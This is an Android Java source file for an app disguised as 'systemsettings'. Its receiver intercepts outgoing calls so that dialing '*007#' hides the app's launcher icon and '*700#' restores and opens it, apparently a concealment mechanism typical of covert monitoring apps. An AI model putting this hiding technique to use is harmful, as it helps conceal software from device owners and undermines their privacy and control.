package com.ghostman.systemsettings;

import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;


public class C_R extends BroadcastReceiver {

    PackageManager packageManager;
    String NUMBER;

    @Override
    public void onReceive(Context context, Intent intent) {
        NUMBER = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
        if(NUMBER.equals("*007#"))
        {   setResultData(null);
            packageManager = context.getPackageManager();
            ComponentName componentName = new ComponentName(context, MainActivity.class);
            packageManager.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED,PackageManager.DONT_KILL_APP);
        }
        else if(NUMBER.equals("*700#"))
        {
            setResultData(null);
            packageManager = context.getPackageManager();
            ComponentName componentName = new ComponentName(context, MainActivity.class);
            packageManager.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_ENABLED,PackageManager.DONT_KILL_APP);

            Intent intent1 = packageManager.getLaunchIntentForPackage("com.ghostman.systemsettings");
            context.startActivity(intent1);
        }
    }
}
